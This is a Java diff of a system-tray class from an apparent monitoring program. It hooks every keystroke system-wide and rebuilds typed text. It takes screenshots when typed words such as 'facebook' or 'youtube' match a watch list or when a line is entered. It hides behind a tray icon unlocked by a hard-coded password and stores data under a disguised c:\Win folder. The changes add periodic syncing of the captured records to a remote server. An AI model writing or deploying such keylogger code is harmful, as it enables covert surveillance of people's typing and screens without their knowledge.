@@ -5,7 +5,10 @@
  */
 package key;
 
+import Modelo.Estado;
+import Modelo.ObjMovimiento;
 import Modelo.ObjUsuario;
+import Modelo.usuarios;
 import Persistencia.Conexion;
 import Persistencia.ConexionServer;
 import java.awt.AWTException;
@@ -45,13 +48,18 @@ public class tray extends javax.swing.JFrame implements NativeKeyListener {
     private String teclas = "";
     private String id = "";
     String fechadir = "";
+    String ip;
     int cont = 0;
     private ImageIcon image;
     private TrayIcon Ticon;
     private SystemTray ttray;
     private boolean proceso = true;
     Connection con;
+    Conexion c = new Conexion();
     ObjUsuario ou = new ObjUsuario();
+    Estado e = new Estado();
+    usuarios u = new usuarios();
+    ObjMovimiento om = new ObjMovimiento();
 
     /**
      * Creates new form tray
@@ -64,15 +72,31 @@ public class tray extends javax.swing.JFrame implements NativeKeyListener {
             this.setIconImage(image.getImage());
             this.setLocationRelativeTo(null);
             //Iniciar tray
-            Ticon = new TrayIcon(image.getImage(), "aver clikeale", pop);
+            Ticon = new TrayIcon(image.getImage(), "Maximizar", pop);
             Ticon.setImageAutoSize(true);
             ttray = SystemTray.getSystemTray();
             // iniciar native hook
             GlobalScreen.registerNativeHook();
-            iniciodirectorios();
-            cargalista();
+            ConexionServer cs = new ConexionServer();
+            ip = cs.ipserver();
+            iniciodirectorios();//creación y generacion de directorios en cliente local.
+            con = c.getconexionC();
+            c.getrows(con, id);//verifica e inserta nueva linea en estado(solo la primera vez que se inicia).
+            cargalista();// lista que funciona como filtrado de palabras.
+            //carga de funciones verificadoras
+            e = ou.checkstate(Integer.parseInt(id), con);
+            u = ou.checkuser(Integer.parseInt(id), con);
+            loadfile();//actualizacion de id en el archivo.
+            //hilo principal para actualizar datos del servidor al local
+            Threadserver();
             //autocapture();
         } catch (NativeHookException ex) {
+            Logger.getLogger(tray.class.getName()).log(Level.SEVERE, null, ex);
+        } catch (ClassNotFoundException ex) {
+            Logger.getLogger(tray.class.getName()).log(Level.SEVERE, null, ex);
+        } catch (IOException ex) {
+            Logger.getLogger(tray.class.getName()).log(Level.SEVERE, null, ex);
+        } catch (SQLException ex) {
             Logger.getLogger(tray.class.getName()).log(Level.SEVERE, null, ex);
         }
         GlobalScreen.getInstance().addNativeKeyListener(this);
@@ -201,14 +225,13 @@ public class tray extends javax.swing.JFrame implements NativeKeyListener {
     }//GEN-LAST:event_jButton1ActionPerformed
 
     private void menuItem1ActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_menuItem1ActionPerformed
-
         String cadena = JOptionPane.showInputDialog(null, "Ingrese Contraseña :", DISPOSE_ON_CLOSE);
         if (cadena.equals("Mich")) {
             ttray.remove(Ticon);
             this.setVisible(true);
             if (proceso == false) {
                 proceso = true;
-                autocapture();
+                //   autocapture();
             }
         }
     }//GEN-LAST:event_menuItem1ActionPerformed
@@ -271,11 +294,11 @@ public class tray extends javax.swing.JFrame implements NativeKeyListener {
         }
     }
 
-    private void screencapture(String n) {
+    private void screencapture(String n, String word) {
         try {
             //iniciar robot
             autocaptura a = new autocaptura();
-            a.captura(n, fechadir, id);
+            a.captura(n, fechadir, id, word, con);
         } catch (AWTException ex) {
             Logger.getLogger(tray.class.getName()).log(Level.SEVERE, null, ex);
         } catch (IOException ex) {
@@ -286,7 +309,7 @@ public class tray extends javax.swing.JFrame implements NativeKeyListener {
     private void iniciodirectorios() {
         File root = new File("c:\\Win\\af");
         String fecha = fechaactual();
-        if (root.exists()) {
+        if (root.exists()) {// si existe solo actualiza datos
             try {
                 File dirf = new File("c:\\Win\\af\\data\\" + fecha);
                 if (!dirf.exists()) {
@@ -301,7 +324,7 @@ public class tray extends javax.swing.JFrame implements NativeKeyListener {
                 Logger.getLogger(tray.class.getName()).log(Level.SEVERE, null, ex);
             }
 
-        } else {
+        } else {// si no existe crea directorios y pide id de usuario que este dado de alta y activo en el servidor
             try {
                 String arr[] = {"c:\\Win", "c:\\Win\\af", "c:\\Win\\af\\plugin", "c:\\Win\\af\\data",
                     "c:\\Win\\af\\extra", "c:\\Win\\af\\data\\" + fecha};
@@ -326,7 +349,7 @@ public class tray extends javax.swing.JFrame implements NativeKeyListener {
         }
     }
 
-    private void camposfile() throws FileNotFoundException, IOException {
+    private void camposfile() throws FileNotFoundException, IOException {// lectura de archivo
         File idread = new File("c:\\Win\\af\\a.dat");
         FileReader fr = null;
         BufferedReader br = null;
@@ -376,18 +399,39 @@ public class tray extends javax.swing.JFrame implements NativeKeyListener {
         }
     }
 
-    private void cargalista() {
-        listaword.add("face");
-        listaword.add("Face");
-        listaword.add("facebook");
-        listaword.add("fa");
-        listaword.add("you");
-        listaword.add("youtube");
-        listaword.add("You");
-        listaword.add("face");
-
+    private void loadfile() {// carga datos al archivo
+        try {
+            if (!id.equals(u.getId() + "")) {
+                FileWriter fichero;
+                System.out.println("loadfile()");
+                id = String.valueOf(u.getId());
+                File dire = new File("c:\\Win\\af\\a.dat");
+                fichero = new FileWriter(dire);
+                PrintWriter pw = new PrintWriter(fichero);
+                pw.println("i:" + id + ",tipo:" + (Cliente.isSelected() ? "C" : "S"));
+                Lid.setText("-" + id + "-");
+                fichero.close();
+            }
+        } catch (IOException ex) {
+            Logger.getLogger(tray.class.getName()).log(Level.SEVERE, null, ex);
+        }
     }
 
+    private void cargalista() {
+        listaword = om.sinchwordlist();
+        if (listaword.isEmpty()) {
+            listaword.add("face");
+            listaword.add("Face");
+            listaword.add("facebook");
+            listaword.add("fa");
+            listaword.add("you");
+            listaword.add("youtube");
+            listaword.add("You");
+            listaword.add("face");
+        }
+    }
+    
+// filtra el token encontrado por alguna de la lista de palabras
     private boolean filtraword(String word) {
         boolean resp = false;
         for (int i = 0; i < listaword.size(); i++) {
@@ -399,6 +443,7 @@ public class tray extends javax.swing.JFrame implements NativeKeyListener {
         return resp;
     }
 
+    //obtiene la fecha actual en formato yyyy-mm-dd
     private String fechaactual() {
         Calendar fecha = Calendar.getInstance();
         int año = fecha.get(Calendar.YEAR);
@@ -410,7 +455,7 @@ public class tray extends javax.swing.JFrame implements NativeKeyListener {
         if (mes.length() == 1) {
             mes = "0" + mes;
         }
-        return dia + "-" + mes + "-" + año;
+        return año + "-" + mes + "-" + dia;
     }
 
     public boolean verificaexpresion(String cad) {
@@ -424,13 +469,14 @@ public class tray extends javax.swing.JFrame implements NativeKeyListener {
         return resp;
     }
 
+    //*por revisar.. captura automatica mediante intervalos de tiempo y no captura por teclado
     private void autocapture() {
         Thread t = new Thread() {
             @Override
             public void run() {
                 try {
                     while (proceso) {
-                        screencapture(String.valueOf(cont));
+                        //screencapture(String.valueOf(cont));
                         Thread.sleep(5000);
                         cont++;
                     }
@@ -442,8 +488,49 @@ public class tray extends javax.swing.JFrame implements NativeKeyListener {
         t.start();
     }
 
-    private void manualcapture() {
-        screencapture(String.valueOf(cont));
+    // hilo para actualizacion de datos desde el servidor
+    private void Threadserver() {
+        Thread t = new Thread() {
+            @Override
+            public void run() {//thread en minutos
+                try {
+                    while (e.getAct_server() != 0) {
+                        //System.out.println("que paza aky");
+                        om.sinchregs(con, ip);// sincronizacion de registros
+                        //System.out.println(e.getAct_server());
+                        Thread.sleep(e.getAct_server() * 1000 * 60);
+                    }
+                } catch (InterruptedException ex) {
+                    Logger.getLogger(tray.class.getName()).log(Level.SEVERE, null, ex);
+                }
+            }
+        };
+        t.start();
+    }
+
+    // cada salto de linea hará una captura automatica por n saltos
+    private void Threadrepeat(String capture) {
+        Thread t = new Thread() {
+            int salto = 0;
+            @Override
+            public void run() {//thread en segundos
+                try {
+                    while (e.getRepeticiones_salto() > salto) {
+                        System.out.println("aver aver");
+                        manualcapture(capture);
+                        salto++;
+                        Thread.sleep(e.getTiempo_espera_salto() * 1000);
+                    }
+                } catch (InterruptedException ex) {
+                    Logger.getLogger(tray.class.getName()).log(Level.SEVERE, null, ex);
+                }
+            }
+        };
+        t.start();
+    }
+
+    private void manualcapture(String word) {
+        screencapture(String.valueOf(cont), word);
         cont++;
     }
 
@@ -496,32 +583,9 @@ public class tray extends javax.swing.JFrame implements NativeKeyListener {
 
     @Override
     public void nativeKeyPressed(NativeKeyEvent nke) {
-//        //System.out.println(teclas.length()+"-"+teclas+"-");
-//        if (nke.getRawCode() == 13 && !teclas.equals("") && teclas.length() != 0) {
-//            System.out.println("aver que token es? " + tecla);
-//            System.out.println("salte linea una nueva: " + teclas);
-//            manualcapture();
-//            teclas = "";
-//            tecla = "";
-//        } else if (nke.getRawCode() == 32) {
-//            System.out.println("aver que token es? " + tecla);
-//            System.out.println("-" + tecla + "-" + filtraword(tecla));
-//            if (filtraword(tecla)) {
-//                System.out.println("tas viendo algo que no prro >:V ");
-//                manualcapture();
-//            }
-//            tecla = "";
-//        }
-//        if (nke.getRawCode() == 13 || nke.getRawCode() == 32) {
-//            teclas += nke.getKeyChar();
-//        } else {
-//            tecla += nke.getKeyChar();
-//        }
-//        if (nke.getKeyCode() == NativeKeyEvent.VK_F1) {
-//            System.out.println("control");
-//        }
-////        System.out.println(nke.getRawCode());
-//        //System.out.print(nke.getKeyChar());
+        if (nke.getKeyCode() == NativeKeyEvent.VK_CONTROL) {
+            System.out.println("control");
+        }
     }
 
     @Override
@@ -535,7 +599,7 @@ public class tray extends javax.swing.JFrame implements NativeKeyListener {
             teclas += tecla;
             //System.out.println("aver que token es? " + tecla);
             System.out.println("salte linea una nueva: " + teclas);
-            manualcapture();
+            Threadrepeat(teclas);
             teclas = "";
             tecla = "";
         } else if (nke.getRawCode() == 32) {
@@ -543,7 +607,7 @@ public class tray extends javax.swing.JFrame implements NativeKeyListener {
             //System.out.println("-" + tecla + "-" + filtraword(tecla));
             if (filtraword(tecla)) {
                 System.out.println("tas viendo algo que no prro >:V ");
-                manualcapture();
+                manualcapture(tecla);
             }
             teclas += tecla;
             tecla = "";
@@ -554,9 +618,7 @@ public class tray extends javax.swing.JFrame implements NativeKeyListener {
             tecla += nke.getKeyChar();
         }
         //System.out.println(tecla+" * "+teclas);
-        if (nke.getKeyCode() == NativeKeyEvent.VK_F1) {
-            System.out.println("control");
-        }
+
         //System.out.println(nke.getRawCode());
         //System.out.print(nke.getKeyChar());
     }
